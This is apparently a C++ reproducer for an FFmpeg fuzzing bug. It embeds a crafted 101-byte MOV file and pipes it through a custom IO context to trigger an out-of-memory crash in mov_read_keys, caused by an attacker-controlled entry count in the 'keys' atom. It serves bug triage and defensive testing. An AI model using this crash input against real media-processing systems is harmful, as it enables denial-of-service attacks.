#include <cstdlib>
#include <cstring>
extern "C" {
#include <libavformat/avformat.h>
}

// Fuzzer artifact bytes — reproduce OOM in mov_read_keys via target_dem_fuzzer
static const unsigned char input[] = {
    0x00, 0x70, 0x74, 0x73, 0x6d, 0x6f, 0x6f, 0x76, 0x00, 0x01, 0x00, 0x08,
    0x6d, 0x65, 0x74, 0x61, 0x74, 0x72, 0x00, 0x08, 0x2e, 0x33, 0x00, 0x00,
    0x00, 0x00, 0x04, 0x0a, 0x00, 0x00, 0x00, 0x32, 0x68, 0x64, 0x6c, 0x72,
    0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x37, 0x6d, 0x64, 0x74, 0x61,
    0x00, 0x73, 0x74, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x61, 0x00, 0x00,
    0x00, 0x08, 0x72, 0x00, 0x76, 0x00, 0x00, 0x00, 0x7e, 0x00, 0x00, 0xed,
    0xfb, 0x9f, 0xff, 0x00, 0x0a, 0x00, 0x41, 0x08, 0x00, 0x00, 0x6b, 0x65,
    0x79, 0x73, 0x00, 0x00, 0x6f, 0x6f, 0x08, 0x00, 0x21, 0x00, 0x76, 0x08,
    0x01, 0x00, 0x08, 0x00, 0x00
};
static const unsigned int input_len = 101;

// Custom IO context: feed fuzz bytes directly to MOV demuxer,
// bypassing file protocol that rejected the input early.
struct IOContext {
    const uint8_t *fuzz;
    int fuzz_size;
    int64_t pos;
    int64_t filesize;
};

static int io_read(void *opaque, uint8_t *buf, int buf_size) {
    IOContext *c = (IOContext *)opaque;
    int size = buf_size < c->fuzz_size ? buf_size : c->fuzz_size;
    if (!c->fuzz_size) {
        c->filesize = c->pos < c->filesize ? c->pos : c->filesize;
        return AVERROR_EOF;
    }
    memcpy(buf, c->fuzz, size);
    c->fuzz += size;
    c->fuzz_size -= size;
    c->pos += size;
    c->filesize = c->filesize > c->pos ? c->filesize : c->pos;
    return size;
}

int main() {
    IOContext opaque = {input, (int)input_len, 0, (int64_t)input_len};

    int io_buffer_size = 32768;
    uint8_t *io_buffer = (uint8_t *)av_malloc(io_buffer_size);
    if (!io_buffer) return 1;

    // Non-seekable IO: matches target_dem_fuzzer behavior for small inputs
    // where IO_FLAT=0 and size<=2048. Seekable IO takes a different code
    // path that rejects the input before reaching the vulnerable code.
    AVIOContext *pb = avio_alloc_context(io_buffer, io_buffer_size, 0,
                                          &opaque, io_read, NULL, NULL);
    if (!pb) return 2;

    // Direct demuxer symbol reference — matches target_dem_fuzzer compilation
    // which links to ff_mov_demuxer directly.
    #ifdef FFMPEG_DEMUXER
    #define DEMUXER_SYMBOL0(DEMUXER) ff_##DEMUXER##_demuxer
    #define DEMUXER_SYMBOL(DEMUXER) DEMUXER_SYMBOL0(DEMUXER)
    extern AVInputFormat DEMUXER_SYMBOL(FFMPEG_DEMUXER);
    const AVInputFormat *fmt = &DEMUXER_SYMBOL(FFMPEG_DEMUXER);
    #else
    const AVInputFormat *fmt = av_find_input_format("mov,mp4,m4a,3gp,3g2,mj2");
    #endif
    if (!fmt) return 3;

    AVFormatContext *avfmt = avformat_alloc_context();
    if (!avfmt) return 4;
    avfmt->pb = pb;

    // OOM in mov_read_keys: unbounded allocation based on attacker-controlled
    // entry count from the 'keys' atom.
    int ret = avformat_open_input(&avfmt, "dummy.mov", fmt, NULL);
    if (ret < 0) { avformat_close_input(&avfmt); return 5; }

    avformat_find_stream_info(avfmt, NULL);

    avformat_close_input(&avfmt);
    av_freep(&pb->buffer);
    avio_context_free(&pb);
    return 0;
}
